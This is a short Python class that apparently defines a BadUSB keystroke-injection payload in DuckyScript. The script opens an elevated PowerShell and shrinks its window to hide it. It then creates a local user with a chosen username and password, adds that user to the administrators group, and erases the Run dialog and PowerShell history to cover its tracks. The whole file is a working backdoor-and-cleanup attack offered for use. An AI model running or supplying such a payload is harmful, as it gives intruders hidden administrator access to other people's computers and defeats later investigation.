class info:
    author="n0nuser"
    description = "Adds administrator account with user-defined user and password."
    function = ""
    parameters = [ "USERNAME" , "PASSWORD"]
    content = """\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750
STRING net user USERNAME PASSWORD /add
ENTER
DELAY 750
STRING net localgroup administrators USERNAME /add"
ENTER
DELAY 750
STRING Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
ENTER
DELAY 1000
STRING Clear-History; rm (Get-PSReadlineOption).HistorySavePath
ENTER
DELAY 750
STRING exit
ENTER\
"""